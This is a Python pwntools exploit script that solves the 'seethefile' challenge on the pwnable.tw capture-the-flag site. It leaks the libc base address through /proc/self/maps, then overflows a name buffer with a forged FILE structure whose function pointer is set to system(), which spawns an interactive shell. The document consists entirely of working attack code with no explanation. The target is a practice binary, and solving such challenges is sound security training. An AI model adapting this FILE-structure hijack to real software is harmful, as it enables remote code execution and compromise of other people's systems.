from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./seethefile")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
else:
	p = remote("chall.pwnable.tw",10200)
	libc = ELF("./libc_32.so.6")

def debug_func():
	gdb.attach(p,"b *0x08048ACB\n b *0x08048B0F")

def openfile(name):
	p.sendlineafter("Your choice :","1")
	p.sendlineafter("What do you want to see :",name)
	p.recvuntil("Open Successful\n")

def readfile():
	p.sendlineafter("Your choice :","2")
	p.recvuntil("Read Successful\n")

def writefile():
	p.sendlineafter("Your choice :","3")
	return p.recvuntil("---------------MENU---------------\n")

def closefile():
	p.sendlineafter("Your choice :","4")
	
def leave_name(name):
	p.sendlineafter("Your choice :","5")
	p.sendlineafter("Leave your name :",name)
	
context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
openfile("/proc/self/maps")
readfile()
writefile()
readfile()
closefile()
info = writefile()
print "###################"
#32:0x94,64:0x228
if debug:
	libc.address =  int(info.split("\n")[1].split("-")[1][:8],16)
else:
	libc.address =  int(info.split("\n")[1].split("-")[0][:8],16)
system_addr = libc.symbols["system"]
#debug()
log.success("libc_base:"+hex(libc.address))
bss_addr = 0x0804B260
name = "/bin/sh;"
name = name.ljust(0x20,"\x00")
name += p32(bss_addr)
name = name.ljust(0x48,"\x00")
name += p32(bss_addr+0x8)
name = name.ljust(0x94,"\x00")
name += p32(bss_addr + 0x94)
name = name.ljust(0x94+4+16*4,"\x00")
name += p32(system_addr)
leave_name(name)
p.interactive()
